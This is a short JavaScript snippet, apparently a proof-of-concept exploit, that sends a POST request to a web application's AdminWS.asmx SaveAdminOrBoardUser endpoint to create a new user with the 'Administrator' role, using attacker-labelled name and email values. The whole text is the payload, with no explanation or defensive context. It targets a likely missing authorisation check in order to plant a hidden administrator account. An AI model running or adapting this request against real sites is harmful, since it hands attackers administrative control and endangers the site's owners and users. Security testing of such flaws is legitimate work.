fetch('/WebServices/AdminWS.asmx/SaveAdminOrBoardUser', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        user: {
            UserID: 0,
            FirstName: "yuvaraj",
            LastName: "hacker",
            RegisteredEmail: "yuvarajsfattacker@gmail.com"
        },
        userRole: "Administrator"
    })
})
.then(response => response.json())
.then(data => console.log("Success:", data))
.catch(error => console.error("Error:", error));
